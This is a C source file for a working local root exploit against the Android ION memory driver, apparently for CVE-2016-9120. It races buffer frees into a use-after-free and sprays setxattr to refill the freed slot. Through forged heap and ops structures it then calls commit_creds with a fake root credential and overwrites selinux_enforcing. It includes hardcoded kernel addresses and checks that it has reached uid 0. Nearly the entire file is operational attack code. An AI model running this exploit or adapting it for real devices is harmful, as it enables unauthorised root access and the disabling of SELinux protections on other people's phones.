#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/xattr.h>

/* CVE-2016-9120, buffer path (the one with a user-controlled trigger window).
 *
 * Measured on THIS kernel (art/ledger-20261013.md):
 *   struct ion_buffer: ref@0 node@8 dev@0x20 heap@0x28 size@0x40 kmap_cnt@0x78
 *                      sg_table@0x88 pages@0x90 vmas@0x98 handle_count@0xa8
 *   struct ion_heap:   dev@0x28 ops@0x38 flags@0x40(bit0=DEFER_FREE) +0xe8 atomic
 *   _ion_buffer_destroy: msm_dma_buf_freed(buf) [ignores arg when list empty]
 *                        -> mutex_lock(dev+0x50) -> rb_erase(buf+8, dev+0x48)
 *                        -> flags&1 ? freelist_add : ion_buffer_destroy
 *   ion_buffer_destroy:  kmap_cnt warn -> ops[0x30](heap,buf) -> ops[0x20](heap,buf)
 *                        -> atomic_sub(size, heap+0xe8) -> ops[0x08](heap,buf)
 *                        -> vfree(buf->pages) -> kfree(buf)
 *   Heaps that do NOT defer-free (so buf really kfree()s): cma, system_contig,
 *   secure_cma. system/chunk/carveout DO defer-free.
 *
 * Trigger: the extra ion_buffer_put comes from close(shared_fd), i.e. whenever
 * we like -> the freed kmalloc-192 slot gets re-filled by our setxattr template.
 *
 * Stages (each with its own oracle, escalating only after a confirmed reach):
 *   probe : ops[*] = printk(heap)  -> our marker string appears in dmesg
 *   root  : ops[0x08] = commit_creds(heap) with heap page also a crafted cred
 *           and rb_erase zeroing selinux_enforcing-16+16
 */
#define IB_REF 0x00
#define IB_NODE 0x08
#define IB_DEV 0x20
#define IB_HEAP 0x28
#define IB_SIZE 0x40
#define IB_KMAP 0x78
#define IB_SG 0x88
#define IB_PAGES 0x90
#define IB_VMAS 0x98
#define IB_HCNT 0xa8

#define IH_OPS 0x38
#define IH_FLAGS 0x40
#define IH_ATOMIC 0xe8

#define SELINUX_ENFORCING 0xffffffc00189be74UL
#define COMMIT_CREDS      0xffffffc00023bb70UL
#define PRINTK            0xffffffc000d8fad8UL   /* T printk (fmt in x0; empty when x0[0]==0) */

#define ION_ALLOC  0xc0204900u
#define ION_FREE   0xc0044901u
#define ION_SHARE  0xc0084904u
#define ION_MAP    0xc0084902u

struct alloc_data { unsigned long long len, align; unsigned mask, flags; unsigned handle; unsigned pad; };
struct fd_data { unsigned handle; int fd; };

#define SPRAY_SZ 192
static int g_ionfd, g_nracer = 4, g_nspray = 16;
static volatile unsigned g_id, g_go, g_ready, g_done, g_stop;
static unsigned char g_tmpl[SPRAY_SZ];
static unsigned long *g_heap_pg, *g_dev_pg, *g_ops_pg, *g_sec_pg;
static char g_path[128] = "/data/local/tmp/ib_spray";
static int g_keepfd[64];
static int g_nkeep;

static void *racer(void *a)
{
    unsigned id = g_id;
    g_ready++;
    while (!g_go) sched_yield();
    ioctl(g_ionfd, ION_FREE, &id);
    g_done++;
    return NULL;
}

static void *sprayer(void *a)
{
    int i;
    while (!g_stop) {
        for (i = 0; i < 50; i++) {
            if (g_stop) break;
            setxattr(g_path, "user.v", g_tmpl, SPRAY_SZ, 0);
        }
        sched_yield();
    }
    return NULL;
}

static void build(const char *marker, int do_root, int do_enforce, unsigned long sub)
{
    unsigned long heap = (unsigned long)g_heap_pg;
    unsigned long parent = do_enforce ? (SELINUX_ENFORCING - 16) : (unsigned long)g_dev_pg;
    memset(g_tmpl, 0, SPRAY_SZ);
    memset(g_heap_pg, 0, 4096);
    memset(g_dev_pg, 0, 4096);
    memset(g_ops_pg, 0, 4096);
    memset(g_sec_pg, 0, 4096);

    *(unsigned int *)(g_tmpl + IB_REF) = 1;                       /* put -> destroy */
    *(unsigned long *)(g_tmpl + IB_NODE) = parent | 1;             /* RED: no rebalance */
    *(unsigned long *)(g_tmpl + IB_NODE + 8) = 0;
    *(unsigned long *)(g_tmpl + IB_NODE + 16) = 0;
    *(unsigned long *)(g_tmpl + IB_DEV) = (unsigned long)g_dev_pg;
    *(unsigned long *)(g_tmpl + IB_HEAP) = heap;
    *(unsigned long *)(g_tmpl + IB_SIZE) = sub;
    *(unsigned long *)(g_tmpl + IB_VMAS) = (unsigned long)(g_tmpl + IB_VMAS); /* self */
    *(unsigned long *)(g_tmpl + IB_VMAS + 8) = (unsigned long)(g_tmpl + IB_VMAS);
    *(unsigned int *)(g_tmpl + IB_HCNT) = 1;                       /* remove_from_handle path */

    strcpy((char *)g_heap_pg, marker);                              /* printk prints this */
    *(unsigned long *)((char *)g_heap_pg + IH_OPS) = (unsigned long)g_ops_pg;
    *(unsigned long *)((char *)g_heap_pg + IH_FLAGS) = 0;           /* not deferred */

    /* ops: [0x08]=free [0x20]=map_dma [0x30]=unmap_dma */
    *(unsigned long *)((char *)g_ops_pg + 0x20) = PRINTK;
    *(unsigned long *)((char *)g_ops_pg + 0x30) = PRINTK;
    *(unsigned long *)((char *)g_ops_pg + 0x08) = do_root ? COMMIT_CREDS : PRINTK;

    if (do_root) {
        /* same page acts as struct cred: usage>=1 at +0, ids 0 at +8.. */
        *(unsigned int *)((char *)g_heap_pg + 0x00) = 0x10000;       /* usage  */
        *(unsigned int *)((char *)g_heap_pg + 0x08) = 0;             /* uid    */
        *(unsigned int *)((char *)g_heap_pg + 0x0c) = 0;             /* gid    */
        *(unsigned int *)((char *)g_heap_pg + 0x10) = 0;             /* suid   */
        *(unsigned int *)((char *)g_heap_pg + 0x14) = 0;             /* sgid   */
        *(unsigned int *)((char *)g_heap_pg + 0x18) = 0;             /* euid   */
        *(unsigned int *)((char *)g_heap_pg + 0x1c) = 0;             /* egid   */
        *(unsigned int *)((char *)g_heap_pg + 0x20) = 0;             /* fsuid  */
        *(unsigned int *)((char *)g_heap_pg + 0x24) = 0;             /* fsgid  */
        *(unsigned int *)((char *)g_heap_pg + 0x28) = 0;             /* secure */
        *(unsigned int *)((char *)g_heap_pg + 0x2c) = 0;             /* session_keyring */
        *(unsigned long *)((char *)g_heap_pg + 0x30) = (unsigned long)g_sec_pg; /* security */
        *(unsigned int *)((char *)g_heap_pg + 0x34) = 0;             /* request_key_auth */
        /* +0x38 = ops pointer (already set; cap_inheritable low word -- harmless) */
        *(unsigned long *)((char *)g_heap_pg + 0x78) = (unsigned long)g_dev_pg;  /* user: __count at +4 */
        *(unsigned long *)((char *)g_heap_pg + 0x80) = (unsigned long)g_dev_pg;  /* group_info-ish */
        /* fake task_security_struct: sids = 1 (kernel) */
        *(unsigned int *)((char *)g_sec_pg + 0) = 0x00000001;
        *(unsigned int *)((char *)g_sec_pg + 4) = 1;
        *(unsigned int *)((char *)g_sec_pg + 8) = 1;
        *(unsigned int *)((char *)g_sec_pg + 12) = 1;
    }
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "probe";
    int rounds = argc > 2 ? atoi(argv[2]) : 50;
    int heapbit = argc > 3 ? atoi(argv[3]) : 9;
    int i, j, fd, r;
    pthread_t th[40];
    char marker[64];

    snprintf(marker, sizeof marker, "XPLAY6_%s_MARKER\n", mode);
    int do_root = !strcmp(mode, "root");
    int do_enforce = do_root || !strcmp(mode, "enforce");

    fd = open(g_path, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("spray file"); return 1; }
    close(fd);
    g_ionfd = open("/dev/ion", O_RDONLY);
    if (g_ionfd < 0) { perror("/dev/ion"); return 1; }
    for (i = 0; i < 4; i++) {
        void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p == MAP_FAILED) { perror("mmap"); return 1; }
        if (i == 0) g_heap_pg = p;
        if (i == 1) g_dev_pg = p;
        if (i == 2) g_ops_pg = p;
        if (i == 3) g_sec_pg = p;
    }
    printf("mode=%s root=%d enforce=%d heapbit=%d rounds=%d marker=%s",
           mode, do_root, do_enforce, heapbit, rounds, marker);
    printf("\nheap=%p dev=%p ops=%p sec=%p\n", (void *)g_heap_pg, (void *)g_dev_pg,
           (void *)g_ops_pg, (void *)g_sec_pg);

    build(marker, do_root, do_enforce, 1);
    for (i = 0; i < g_nspray; i++)
        pthread_create(&th[i], NULL, sprayer, (void *)(long)i);

    for (r = 0; r < rounds; r++) {
        struct alloc_data ad;
        struct fd_data sd;
        memset(&ad, 0, sizeof ad);
        ad.len = 0x2000; ad.align = 4096; ad.mask = 1u << heapbit;
        errno = 0;
        if (ioctl(g_ionfd, ION_ALLOC, &ad)) { printf("alloc errno=%d (heapbit %d unusable)\n", errno, heapbit); break; }
        memset(&sd, 0, sizeof sd); sd.handle = ad.handle;
        errno = 0;
        if (ioctl(g_ionfd, ION_SHARE, &sd)) { printf("share errno=%d\n", errno); break; }
        if (g_nkeep < 64) g_keepfd[g_nkeep++] = sd.fd;          /* keep dangling refs */

        g_id = ad.handle; g_go = 0; g_ready = 0; g_done = 0;
        for (j = 0; j < g_nracer; j++)
            pthread_create(&th[g_nspray + j], NULL, racer, (void *)(long)j);
        while (g_ready < (unsigned)g_nracer) sched_yield();
        g_go = 1;
        while (g_done < (unsigned)g_nracer) sched_yield();
        for (j = 0; j < g_nracer; j++) pthread_join(th[g_nspray + j], NULL);

        /* the trigger: every kept fd is one ion_buffer_put on a possibly-freed buffer */
        for (j = 0; j < g_nkeep; j++) {
            build(marker, do_root, do_enforce, 1);   /* refresh template each time */
            close(g_keepfd[j]);
            g_keepfd[j] = g_keepfd[--g_nkeep];
            if (do_enforce) {
                FILE *f = popen("getenforce", "r");
                char l[64] = "";
                if (f) { if (fgets(l, sizeof l, f)) {} pclose(f); }
                if (strstr(l, "Permissive")) { printf("*** ENFORCING OFF after %d rounds\n", r); goto done; }
            }
            if (do_root) {
                FILE *f = popen("id -u", "r");
                char l[64] = "";
                if (f) { if (fgets(l, sizeof l, f)) {} pclose(f); }
                if (!strcmp(l, "0\n")) { printf("*** ROOT (uid 0) reached\n"); goto done; }
            }
        }
    }
done:
    g_stop = 1;
    for (i = 0; i < g_nspray; i++) pthread_join(th[i], NULL);
    for (i = 0; i < g_nkeep; i++) close(g_keepfd[i]);
    printf("rounds done=%d -- check dmesg for the marker\n", r);
    close(g_ionfd);
    return 0;
}
